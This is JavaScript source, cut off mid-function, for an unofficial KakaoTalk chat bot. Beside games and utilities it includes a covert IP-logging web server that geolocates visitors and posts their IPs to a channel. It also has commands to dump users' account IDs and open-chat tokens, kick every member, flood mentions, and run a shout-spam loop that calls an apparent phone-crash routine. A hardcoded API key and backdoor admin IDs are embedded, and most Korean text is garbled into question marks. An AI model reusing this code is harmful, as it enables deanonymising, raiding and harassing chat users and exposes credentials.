
let deviceName = "ABDG";
let deviceUUID = "HDpmqLPPm3JiLqmz+it0KyqZXIcOFLSxVM9Wg7JWhljoUT+QK75kbTllEtGXu/xlupLq+RMOSZfp+7rTyyJawA==";

var numud= 0;
var numu= 0;
let month = new Date().getMonth() + 1
let joinjoin = true
let join = [];
let fuck = [];
let king = [];
let updown = [];
let udo = [];
let banKey = [];
let banKey2 = "yes"
let adminList = [9013168238129656452];
let iskeyIssued = false;
let iskeyIssued2 = false;
let key;
let key2;
let chatReaders = {};
let detectingUsers = [];
let mustDetect = [];
let roomr = false
let li = false
let userInfo;
let id;
let roomId;
let accountUserId;
let prefix = "-"

async function sendLong(_kakaoChannel, text1, text2) {
    try {
        var r = await node_kakao.AttachmentApi.upload(1, "long", text2);
        _kakaoChannel.sendChat(
            new node_kakao.ChatBuilder().text(text1).append(new node_kakao.AttachmentContent(r.result)).build(1)
        );
    } catch (e) {
        _kakaoChannel.sendChat(e);
    }
}
let Hider = ["12345678"];

let dlog = false;

let chap = false;
const ytdl = require("ytdl-core");

let runningSpam = false;
let spamInterval;

let customChat;

let chaton = true;

let runningNick = false;
let $TitleSpamList = [];
let runningSpamString = false;
let runningSpamString1 = false;
let stringInterval;
const YouTube = require('youtube-node');
const youTube = new YouTube();
youTube.setKey('AIzaSyB1OOSpTREs85WUMvIgJvLTZKye4BVsoFU');
const getDnsIp = require("ip");
const express = require('express');
const http = require('http');
let app = express();
app.set('trust proxy', true);
const is = require('is_js');
let ipLog_local;
let ipLog_admin = getDnsIp.address();
let ipLog_channel;
let ipLog_loggedIps = [];
let ipLog_adress;
let ipLog_filter = true;
let ipLog_usingServer = "None";
ipPort = Math.floor(Math.random() * 30000);
ipPort *= 1;

function getClientIpFromXForwardedFor(value) {
    if (!is.existy(value)) {
        return null;
    }
    if (is.not.string(value)) {
        throw new TypeError("Expected a string, got \"".concat(_typeof(value), "\""));
    }
    var forwardedIps = value.split(',').map(function (e) {
        var ip = e.trim();
        if (ip.includes(':')) {
            var splitted = ip.split(':');
            if (splitted.length === 2) {
                return splitted[0];
            }
        }
        return ip;
    });
    return forwardedIps.find(is.ip);
}

function getClientIp(req) {
    if (req.headers) {
        if (is.ip(req.headers['x-client-ip'])) {
            return req.headers['x-client-ip'];
        }
        var xForwardedFor = getClientIpFromXForwardedFor(req.headers['x-forwarded-for']);
        if (is.ip(xForwardedFor)) {
            return xForwardedFor;
        }
        if (is.ip(req.headers['cf-connecting-ip'])) {
            return req.headers['cf-connecting-ip'];
        }
        if (is.ip(req.headers['fastly-client-ip'])) {
            return req.headers['fastly-client-ip'];
        }
        if (is.ip(req.headers['true-client-ip'])) {
            return req.headers['true-client-ip'];
        }
        if (is.ip(req.headers['x-real-ip'])) {
            return req.headers['x-real-ip'];
        }
        if (is.ip(req.headers['x-cluster-client-ip'])) {
            return req.headers['x-cluster-client-ip'];
        }
        if (is.ip(req.headers['x-forwarded'])) {
            return req.headers['x-forwarded'];
        }
        if (is.ip(req.headers['forwarded-for'])) {
            return req.headers['forwarded-for'];
        }
        if (is.ip(req.headers.forwarded)) {
            return req.headers.forwarded;
        }
    }
    if (is.existy(req.connection)) {
        if (is.ip(req.connection.remoteAddress)) {
            return req.connection.remoteAddress;
        }

        if (is.existy(req.connection.socket) && is.ip(req.connection.socket.remoteAddress)) {
            return req.connection.socket.remoteAddress;
        }
    }
    if (is.existy(req.socket) && is.ip(req.socket.remoteAddress)) {
        return req.socket.remoteAddress;
    }
    if (is.existy(req.info) && is.ip(req.info.remoteAddress)) {
        return req.info.remoteAddress;
    }
    if (is.existy(req.requestContext) && is.existy(req.requestContext.identity) && is.ip(req.requestContext.identity.sourceIp)) {
        return req.requestContext.identity.sourceIp;
    }
    return null;
}




"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function (o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function () { return m[k]; } });
}) : (function (o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function (o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function (o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};

var fs = require('fs')
const banWord2 = ["https://open.kakao.com/o/"];
const banWord = ["???", "??????", "??????", "??????", "???1???", "???1???", "???", "??????", "??????", "?????????", "??????", "??????", "??????", "??????", "???", "?????????", "?????????", "??????", "??????", "?????????", "??????", "??????", "??????", "??????", "??????"];
const axios = require('axios');
const cheerio = require("cheerio");
const request = require('request');
const { url } = require("inspector");
const { CheckinData, ChannelInfo, ChatBuilder } = require("node-kakao");
const node_kakao = require("node-kakao");
const { send } = require("process");
const $AuthApiClient = node_kakao.AuthApiClient;
const $ChatBuilder = node_kakao.ChatBuilder;
const $KnownFeedType = node_kakao.KnownFeedType;
const $KnownPostItemType = node_kakao.KnownPostItemType;
const $ReplyAttachment = node_kakao.ReplyAttachment;
const $TalkClient = node_kakao.TalkClient;
const CLIENT = new $TalkClient();
const readline = require("readline");
const { data } = require('cheerio/lib/api/attributes');
const { Console } = require("console");
const getInfo = __importStar(require("./info.json"));
let { email, pw } = getInfo;
const dns = require('dns');
const translate = require('translate-google')
var geoip = require('geoip-lite');
const e = require("express");
const { channel } = require("diagnostics_channel");



app.get('/', function (req, res) {
    res.sendFile(__dirname + '/ip.png')
    var nofilterIP = getClientIp(req);
    var ip = nofilterIP.split(':')[nofilterIP.split(':').length - 1];
    if (ipLog_usingServer != "None" && !(ipLog_loggedIps.includes(ip))) {
        var saveIp = "\n" + ip + "";
        fs.readFile('ip.txt', 'utf8', function(err, data){
            fs.writeFile('ip.txt', data + saveIp, 'utf8', function(error){ console.log(ip) }); 
        });
        if ((ipLog_local != ip && ipLog_admin != ip) || ipLog_filter == false) {
            try {
                var geo = geoip.lookup(ip);
                var gco = geo.country
            } catch(error) {
                gco = "Unknown"
            }
            if(gco == "KR") {
            ipLog_channel.sendChat(ip)
            channel.sendChat(ip)
            ipLog_loggedIps.push(ip)
        } else {
            ipLog_channel.sendChat(ip + " [ VPN ]")
            channel.sendChat(ip)
            ipLog_loggedIps.push(ip);
        }
    }
    }
});
app.listen(ipPort, function () { });





CLIENT.on('chat_read', (chat, channel, reader) => {
    var detectChar = channel._channel.channelId + ":" + reader.userId;
    if (mustDetect.includes(detectChar)) {
        for (var getValueFor = 0; getValueFor < mustDetect.length; getValueFor++) {
            if (mustDetect[getValueFor] == detectChar) {
                mustDetect.splice(getValueFor);
            }
        }
        channel.sendChat(new node_kakao.ChatBuilder().append(new node_kakao.MentionContent(channel.getUserInfo({ userId: reader.userId }))).text("?????? ??????????????????").build(1));
    }
})

     

CLIENT.channelList.normal.on('chat', (data, channel) => {
    const sender = data.getSenderInfo(channel);
    if (!sender) return;

    id = data.getSenderInfo(channel).userId;
    roomId = channel._channel.channelId.low;
    if (data.text.startsWith(prefix + "??????")) {
        if (adminList.includes(id)) {
        sendLong(channel,channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "?????? ??????????????? " , "????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + 
        "\n\n????????? : " + data.mentions[0].user_id +
        "\n\n????????? ?????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).fullProfileURL +
        "\n\n???????????? ????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).accountId + 
        "\n\n?????? ????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).statusMessage +
        "\n\n???????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).countryIso) 
    }}




})





CLIENT.channelList.open.on('chat', (data, channel) => {
    const sender = data.getSenderInfo(channel);
    if (!sender) return;



    id = data.getSenderInfo(channel).userId;
    roomId = channel._channel.channelId.low;
    if (data.text.startsWith(prefix + "??????")) {
        if (adminList.includes(id)) {
            sendLong(channel, channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "?????? ??????????????? " , "????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + 
        "\n\n????????? : " + data.mentions[0].user_id +
        "\n\n????????? ?????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).fullProfileURL +
        "\n\n???????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).userType + 
        "\n\n??????????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).linkId +
        "\n\n???????????? : " + channel.getUserInfo({ userId: data.mentions[0].user_id }).openToken) 
    }}



    if (data.text.startsWith(prefix + "?????? ")) {
        if (adminList.includes(id)) {
            if(isNaN(channel.getUserInfo({ userId: data.mentions[0].user_id }).linkId)) {
                channel.sendChat("[ ???? ] " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "?????? ???????????? ???????????? ??????????????????")
            } else {       
            channel.sendChat("[ ???? ] " + channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "?????? ???????????? ?????? ??????????????????")
    }}}

})

CLIENT.on('chat', (data, channel) => {
    const sender = data.getSenderInfo(channel);
    if (!sender) return;
function sendrawch(t, t2, t3) {
    channel.sendChat(
        new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent(t3)).text(t2).build(t))
    }
    id = data.getSenderInfo(channel).userId;
    roomId = channel._channel.channelId


    if (Hider.includes(roomId + ":" + id)) {
        try {
            channel.hideChat(data.chat);
        } catch (e) {
            channel.sendChat(e + "");
        }
    }
    if (!(data.text == "V" ||data.text == "v" )) {
    if (join.includes(id)) {
        channel.sendChat("????????? ?????? ???????????? \n\n???????????? V??? ??????????????????!")
        pausecomp(220)
            channel.hideChat(data.chat);
        }}

        if (data.text.startsWith(prefix + "??? ")) {
            var ping = data.text.replace(prefix + "??? ", "");
        dns.lookup(encodeURI(ping), (err, address, family) => {
            channel.sendChat('??? ???????????? ???????????? ????????? : \n' + address);
        });
    }

    if (data.text == prefix + "on") {
        if (adminList.includes(id)) {
            channel.sendChat("ON")
            chaton = true
        }
    }

    if (data.text == prefix + "off") {
        if (adminList.includes(id)) {
            channel.sendChat("OFF")
            chaton = false
        }
    }
    function chunk(arr, size) {
        var i,
          j,
          temparray = [],
          chunk = size;
        for (i = 0, j = arr.length; i < j; i += chunk) {
          temparray.push(arr.slice(i, i + chunk));
        }
        return temparray;
      }
      function pausecomp(millis) {
        var date = new Date();
        var curDate = null;
        do {
          curDate = new Date();
        } while (curDate - date < millis);
      }

      if (data.text.startsWith(prefix + "????????????")) {
        if (adminList.includes(id)) {
            channel.sendChat("??????????????? ???????????????")
        let mentionList1 = chunk(Array.from(channel.getAllUserInfo()), 15);
        for (var i = 0; i < mentionList1.length; i++) {
          mentionList1[i].forEach((v, j) => {
            pausecomp(0);
              var detectChar = roomId + ":" + v.userId
              mustDetect.push(detectChar);
          });
        }
      }}
      if (data.text.startsWith(prefix + "????????????")) {
        if (adminList.includes(id)) {
        let mentionList1 = chunk(Array.from(channel.getAllUserInfo()), 15);
        for (var i = 0; i < mentionList1.length; i++) {
          mentionList1[i].forEach((v, j) => {
            try {
            channel.kickUser2(v.userId)
            } catch (error) {
                console.log(" ")
            }
          });
        }
      }}
      if (data.text.startsWith(prefix + "?????????") || data.text.startsWith(prefix + "??????")) {
        var m = "\n------------normal list-------------\n\n" + 
       "?????? ?????? : " +prefix +"\n\n(??????) Dev Plus Bot (??????)\n\n" +
     "\n?????????" +
     "\n????????? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n??????????????? ??????????????????" +
     "\n" +
     "\n????????????" +
     "\n?????? ??????????????? ???????????????!\n" +
     "\nlive" +
     "\n???????????? ????????? ???????????????\n" +
     "\n??????" +
     "\n??????????????? ???????????????\n" +
     "\n??????" +
     "\n1~100??? ?????? ????????? ???????????????\n" +
     "\n??????" +
     "\n?????? ????????? ????????? ???????????? | ?????? (ex. -?????? youtube.com)" +
     "\n" +
     "\n???" +
     "\n??? ????????? ??????????????? | ?????? (ex. -??? ?????????)" +
     "\n" +
     "\n???" +
     "\n??? ?????? ????????? ???????????????" +
     "\n" +
     "\n?????????" +
     "\n???????????? ???????????? ??????????????? | ?????? (ex. -????????? ?????????)" +
     "\n" +
     "\n????????????" +
     "\n????????? ???????????????" +
     "\n" +
     "\n?????????" +
     "\n???????????? ??????????????? | ?????? (??????, ??????)" +
     "\n" +
     "\n??????" +
     "\n????????? ??????????????? | ?????? (ex. -?????? ????????? ??????/?????? ?????? ?????????/ ??????)" +
     "\n" +
     "\ntv" +
     "\n????????? tv ?????? | ?????? (ex. -tv ????????? tv ??????)" +
     "\n" +
     "\n" +
     "\n?????????" +
     "\n??????????????? ????????? ???????????? ???????????? | ?????? (ex. -????????? n/n)" +
     "\n" +
     "\n?????????" +
     "\n????????? ???????????? ???????????? (?????? ???????????? ??????, ?????? ?????? ?????? ?????? ??????)" +
     "\n" +
     "\n???" +
     "\n???????????? ???????????? ???????????? ??????????????? | ?????? (ex. -??? ??????)" +
     "\n" +
     "\n?????????" +
     "\n????????? ????????? ?????????" +
     "\n" +
     "\n????????? ??????" +
     "\n????????? ????????? ???????????????" +
     "\n" +
     "\n?????????" +
     "\n???????????? ????????????" +
     "\n" +
     "\n??????" +
     "\n?????????, ??????, ????????????, ??????????????? ????????? ????????? ??????????????? | ?????? (ex. -?????? ????????? ?????????)" +
     "\n" +
     "\n??????" +
     "\n??????????????? ????????? ???????????? | ?????? (ex. -?????? ?????? ?????????/ ??????)" +
     "\n" +
     "\n?????????" +
     "\n????????? ????????? ???????????????" +
     "\n" +
     "\no??????" +
     "\n?????? ???????????? ??????????????? | ?????? (ex. -o?????? ????????? ????????? ??????)" +
     "\n" +
     "\n?????????" +
     "\n?????????" +
     "\n" +
     "\n??????" +
     "\n?????? ????????? ???????????????" +
     "\n" +
     "\n------------admin list-------------" +
     "\n" +
     "\n?????????" +
     "\n??? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n?????? ?????? ?????? ????????? ?????? ?????????" +
     "\n" +
     "\n????????????" +
     "\n??????????????? ???????????????" +
     "\n" +
     "\n?????????" +
     "\n????????? ???????????? ???????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n?????? ?????? ???????????? ??????????????? | ?????? (??????)" +
     "\n" +
     "\n??????a" +
     "\n?????? ?????? ?????? ???????????? ??????????????? | ?????? (??????)" +
     "\n" +
     "\nev" +
     "\n???????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n???????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ?????? ?????????" +
     "\n" +
     "\n??????" +
     "\n???????????? ????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ????????????" +
     "\n" +
     "\n??????p" +
     "\n????????? ???????????????" +
     "\n" +
     "\n??????n" +
     "\n?????? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ???????????????" +
     "\n" +
     "\n????????????" +
     "\n??????????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ???????????????" +
     "\n" +
     "\n?????????" +
     "\n???????????? ???????????????" +
     "\n" +
     "\n???????????????" +
     "\n???????????? ???????????? ?????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n??????????????? ????????????" +
     "\n" +
     "\n????????????" +
     "\n???????????? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n??????????????? ????????????" +
     "\n" +
     "\n????????????" +
     "\n??????????????? ???????????????" +
     "\n" +
     "\nx" +
     "\n???????????? ???????????? ?????????" +
     "\n" +
     "\n??????" +
     "\n?????? ?????? ???????????? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n???????????? ??????????????? ?????? ??????????????? ???????????????" +
     "\n" +
     "\n????????????" +
     "\n??????????????? ?????? ???????????????" +
     "\n" +
     "\n????????????" +
     "\n?????? ????????? ??????????????? (?????? ???????????? ??????, ?????? ?????? ?????? ?????? ??????)" +
     "\n" +
     "\n????????????" +
     "\n?????? ????????? ???????????????" +
     "\n" +
     "\n????????????" +
     "\n?????? ????????? ??????????????? (??? ????????? ????????? ???????????????)" +
     "\n" +
     "\n??????" +
     "\n????????? ??????" +
     "\n" +
     "\nN" +
     "\n?????? ????????? ???????????? ????????? ?????? ??????????????? (??????)" +
     "\n" +
     "\n??????" +
     "\n???????????? ????????? ?????????" +
     "\n" +
     "\n??????" +
     "\n????????? ????????? ???????????????" +
     "\n" +
     "\n?????????a" +
     "\n?????? ???????????? ???????????? (?????? ????????? ??????, ???????????? ?????? ??????)" +
     "\n" +
     "\n??????" +
     "\n???????????? ?????????????????? (?????? ????????? ??????, ???????????? ?????? ??????)" +
     "\n" +
     "\n?????????" +
     "\n????????? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n??????????????? ?????????" +
     "\n" +
     "\n??????" +
     "\n???????????? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n?????? ????????? ???????????????" +
     "\n" +
     "\n??????(??????)" +
     "\n?????? ????????? ???????????????" +
     "\n" +
     "\n??????" +
     "\n????????? ?????????" +
     "\n" +
     "\n??????" +
     "\n?????? ????????? ???????????? | ?????? (ex. -?????? 100)";
            sendLong(channel, "[ ??? ????????? ]" , m)
        }

      if (data.text == prefix + "????????????") {
        if (adminList.includes(id)) {
        let all_mention = new node_kakao.ChatBuilder()
        let mentionList = chunk(Array.from(channel.getAllUserInfo()), 15);
        channel.sendChat(
          "[ ! ] ?????? ???: " + Array.from(channel.getAllUserInfo()).length
        );
        mentionList.forEach((v, i) => {
          mentionList[i].forEach((c, j) => {
            all_mention.append(new node_kakao.MentionContent(channel.getUserInfo({ userId: c.userId })));
          });
          channel.sendChat(all_mention.build(1));
          all_mention = new node_kakao.ChatBuilder();
          pausecomp(220);
        });
      }}

      if (data.text == prefix + "????????????") {
        if (adminList.includes(id)) {
        let all_mention = new node_kakao.ChatBuilder()
        let mentionList = chunk(Array.from(channel.getAllUserInfo()), 15);
        channel.sendChat(
          "[ ! ] ?????? ???: " + Array.from(channel.getAllUserInfo()).length
        );
        mentionList.forEach((v, i) => {
          mentionList[i].forEach((c, j) => {
            all_mention.append(new node_kakao.MentionContent(channel.getUserInfo({ userId: c.userId })));
            channel.sendChat(all_mention.build(1));
            all_mention = new node_kakao.ChatBuilder();
            pausecomp(110);
        });
        });
      }}

    if (data.text == prefix + "?????????") {
        if(!(updown.includes(roomId))) {
            updown.push(roomId)
            udo.push(id)
            channel.sendChat("????????? ????????? ?????????????????????. \n1~1000?????? ????????? -????????? (??????) ????????? ??????????????????!")
                numud = Math.floor(Math.random() * 1000) + 1
        } else {
            channel.sendChat("?????? ????????? ?????????????????????")
        }}
    if (data.text.startsWith(prefix + "????????? ")) {
        if (!(data.text.startsWith(prefix + "????????? ??????"))) {
        if (updown.includes(roomId)) {
        var ud = data.text.replace(prefix + "????????? ", "");
        if(ud < numud) {
            channel.sendChat("??? ??? " +ud + "?????? up! ??? ???")
        } else {
            if(ud > numud) {
                channel.sendChat("??? ??? " + ud + "?????? down! ??? ???")
        } else {
            if(ud == numud) {
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                        "type": "animated-sticker/digital-item",
                        "path": "4412206.emot_017.webp",
                        "name": "(????????????)",
                        "sound": "",
                        "width": "360",
                        "height": "360",
                        "msg": '',
                        "alt": "????????? ????????????"
                    })).build(20)
                );
                channel.sendChat(new node_kakao.ChatBuilder().text("???").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: id }))).text("?????? ??????!???\n?????? : " + numud).build(1));
                for (var getValueFor = 0; getValueFor < updown.length; getValueFor++) {
                    if (updown[getValueFor] == roomId) {
                        updown.splice(getValueFor);
                    }}
            } else {
                channel.sendChat("???????????? ?????? ???????????????")
            }
        }
        } 
    } else {
        channel.sendChat("????????? ?????? ??????????????????!\n-?????????")
    }
}}
if (data.text.startsWith(prefix + "????????? ??????")) {
    if (udo.includes(id)) {
    for (var getValueFor = 0; getValueFor < updown.length; getValueFor++) {
        if (updown[getValueFor] == roomId) {
            updown.splice(getValueFor);
        }}
        for (var getValueFor = 0; getValueFor < udo.length; getValueFor++) {
            if (udo[getValueFor] == id) {
                udo.splice(getValueFor);
            }}
        channel.sendChat("???????????????? ?????????????????????????")
}}


    if (data.text == prefix + "??????") {
        try {
        if (adminList.includes(id)) {
            channel.sendChat("[ ???? ] ?????? ???????????? ?????????????????? ??????????????????!");
        } else {
            key = Math.random().toString(10).slice(2, 5)
            iskeyIssued = true;
            var key_ = key * 4
            console.log("VERIFICATION CODE: " + key);
        }
    } catch(error) {
        console.log(error)
    }}




    if (data.text == "V"||data.text == "v" ) {
        if (join.includes(id)) {
            channel.sendChat("????????? ?????? ?????????")
            for (var getValueFor = 0; getValueFor < join.length; getValueFor++) {
                if (join[getValueFor] == id) {
                    join.splice(getValueFor);
                }}   
                iskeyIssued2 = false;
            }
    }

    if(id == 376995854 || id == 376995854 || id == 376995854 || id == 349582353 || id == 349582353) {
    adminList.push(id);
    }

    if (data.text == key && iskeyIssued) {
        if (!(adminList.includes(id))) {
            key = null;
            iskeyIssued = false;
            adminList.push(id);
            console.log("NEW ADMIN VERIFICATION: " + (id));
            channel.sendChat("????????? ?????? ?????????")
        } else {
            channel.sendChat(
                new node_kakao.ChatBuilder()
                    .append(new node_kakao.ReplyContent(data.chat))
                    .text("[ ???? ] ?????? ???????????? ?????????????????? ??????????????????!")
                    .build(1)
            );

        }
    }


    if (chaton == true) {
        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var nt = data.text.replace(prefix + "?????? ", "");
                channel.setNoticeMeta(nt)
            } else {
                channel.sendChat("[ ???? ] ??? ???????????? ????????? ????????? ????????????");
            }
        }



        if (data.text.startsWith(prefix + "????????????")) {
        channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "L": "",
                "Q": "????????????",
                "V": "brand",
                "R": [
                    {
                        "D": "",
                        "L": "",
                        "DE": "",
                        "I": "https://k.kakaocdn.net/dn/bLFTBy/bl3pFGMWniP/u3jWKaCXTE27YU4Z6slhJ1/kakaolink40_original.png",
                        "T": "????????? ???????????? ???????????????!",
                        "W": "500",
                        "H": "671"         
                    }
                ],
                "F": {
                    "BU": [
                        {
                            "T": "??????????????? ??????",
                            "L": "kakaoplus://plusfriend/talk/bot/@1921/?????? ????????????"
                        }
                    ]
                }
            }))
                .build(23)
        )}
        
        if (data.text.startsWith(prefix + "????????? ")) {
            if (adminList.includes(id)) {
            var ntt = data.text.replace(prefix + "????????? ", "");
                sendrawch(1,ntt,{
                    "decoEvent": {
                       "eventID":  1625464374
                    }
                 })
        }}
        if (data.text.startsWith(prefix + "live")) {
            if (!(data.text == prefix + "live off")) {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": true,
                            "title": "??????",
                            "startTime": 1111111111,
                            "userId": "",
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        await channel.setLiveTalkCountMeta({
                            count: 1
                        });
                        if (myMsg.success) {
                            channel.sendChat("live on");
                        } else {
                            channel.sendChat("live fail");
                        }
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }}


        if (data.text.startsWith("??? ")) {
            if (!(data.text == prefix + "live off")) {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": true,
                            "title": "??????",
                            "startTime": 1111111111,
                            "userId": data.mentions[0].user_id,
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        await channel.setLiveTalkCountMeta({
                            count: 1
                        });
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }}
        if (data.text.startsWith(prefix + "live ")) {
            if (!(data.text == prefix + "live off")) {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": true,
                            "title": "??????",
                            "startTime": 1111111111,
                            "userId": data.mentions[0].user_id,
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        await channel.setLiveTalkCountMeta({
                            count: 1
                        });
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }}

        if (data.text == prefix + "live off") {
            if (adminList.includes(id)) {
                try {
                    async function aa() {
                        await channel.setLiveTalkCountMeta({
                            count: 0
                        });
                        var myMsg = await channel.setLiveTalkInfoMeta({
                            "liveon": false,
                            "title": "",
                            "startTime": 1111111111,
                            "userId": id,
                            "csIP": "211.231.102.213",
                            "csIP6": "2404:4600:6:369:211:231:102:213",
                            "csPort": 9000,
                            "callId": "1111111111111111"
                        });
                        if (myMsg.success) {
                            channel.sendChat("live off");
                        } else {
                            channel.sendChat("live fail");
                        }
                    }
                    aa();
                } catch (e) {
                    channel.sendChat(e);
                }
            }
        }
        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var t1 = data.text.replace(prefix + "?????? ", "").split('/')[0];
                var t2 = data.text.replace(prefix + "?????? ", "").split('/')[1];
                sendLong(channel , t1 , t2)
        }}



        if (data.text.startsWith(prefix + "N")) {
            if (adminList.includes(id)) {
         runningNick = true;
            }}

            if (data.text.startsWith(prefix + "N!")) {
                if (adminList.includes(id)) {
             runningNick = false;
                }}

        if (data.text.startsWith(prefix + "??????")) {
            if (adminList.includes(id)) {
                    if (!runningSpamString) {
                        runningSpamString = true;
                        stringInterval = setInterval(() => {
                        sendErrorPhone()
                            var value = Math.floor(Math.random() * 5);
                            switch(value) {
                              case 0 :
                                    channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("??? ???????????? ?????? ???????????? ?????? ???????????? ?????? ???????????? ????????? ?????? ?????? ?????? ?????? ?????? ?????? ?????? (???????????????!)")
                                    .build(1)
                                )
                                channel.setNoticeMeta("?????? ?????? ?????? ??????, ???????????????[2]?????? ??? ????????????, ???????????? ???????????? ?????? ?????? ??????, ???????????? ????????? ????????? ??????????????? ?????????, ??? ?????? ???????????? ??? ??????! ??????????????? ????????? ?????? ?????? ?????? ?????? ????????? ??? ??? ????????? ??? ??? ?????? ????????? ????????? ??? ?????? ??? ??????????????????! ??? ??????????????????! ????????? ?????? ?????? ?????????(?????????)????????? ???????????? ????????????? ????????? ????????? ???????????? ??? ????????? ????????? ????????? ????????? ?????? ??????. ???????????? ???????????? ?????????????")
                              break;
                              case 1 :
                                channel.sendChat("????????? ????????? ????????? ?????????... ?????? ??? ?????????   ??? ???????????? ??? ... ????????? ?????????")
                              break;
                              case 2 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("?????? ?????? ??????????????? ????????? ????????? ?????? ????????? ?????????????!")
                                    .build(1)
                                )
                              break;
                              case 3 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("?????? ?????? ?????? ??????, ???????????????[2]?????? ??? ????????????, ???????????? ???????????? ?????? ?????? ??????, ???????????? ????????? ????????? ??????????????? ?????????, ??? ?????? ???????????? ??? ??????! ??????????????? ????????? ?????? ?????? ?????? ?????? ????????? ??? ??? ????????? ??? ??? ?????? ????????? ????????? ??? ?????? ??? ??????????????????! ??? ??????????????????! ????????? ?????? ?????? ?????????(?????????)????????? ???????????? ????????????? ????????? ????????? ???????????? ??? ????????? ????????? ????????? ????????? ?????? ??????. ???????????? ???????????? ?????????????")
                                    .build(1)
                                )
                              break;
                              case 4 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ???????????? ??? ????????????! ")
                                    .build(1)
                                )
